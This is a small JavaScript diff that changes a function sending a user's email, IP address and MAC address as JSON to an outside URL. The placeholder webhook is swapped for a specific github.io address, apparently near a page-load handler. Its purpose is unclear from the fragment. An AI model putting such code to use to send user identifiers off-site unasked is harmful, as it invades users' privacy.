@@ -33,7 +33,7 @@ async function sendNotification(email, ipAddress, macAddress) {
     body: JSON.stringify(data),
   };
 
-  await fetch('https://your-webhook-url.com', options);
+  await fetch('https://osip-d25.github.io/filetest/', options);
 }
 
 // Обработчик события загрузки страницы
